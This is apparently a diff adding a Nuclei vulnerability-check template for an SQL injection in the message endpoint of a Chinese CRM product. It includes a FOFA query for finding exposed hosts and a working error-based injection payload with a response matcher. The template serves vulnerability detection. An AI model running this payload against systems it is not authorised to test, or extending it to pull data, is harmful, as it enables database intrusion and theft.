@@ -1,0 +1,27 @@
+id: bangjiecrm-sql-injection
+
+info:
+  name: 帮管家CRM message接口SQL注入漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: app="帮管客-CRM"
+      帮管家CRM系统message接口存在SQL注入漏洞。攻击者可通过构造恶意SQL请求获取数据库访问权限，导致敏感数据泄露。该漏洞影响所有未修复的版本。
+  tags: 帮管家CRM
+
+http:
+- raw:
+  - |
+    GET /index.php/message?page=1&pai=1%20and%20extractvalue(0x7e,concat(0x7e,(select%20md5(1)),0x7e))%23&xu=desc HTTP/1.1
+    Host: {{Hostname}}
+    Accept-Encoding: gzip, deflate
+    Accept: */*
+    Connection: close
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'a0b923820dcc509a'
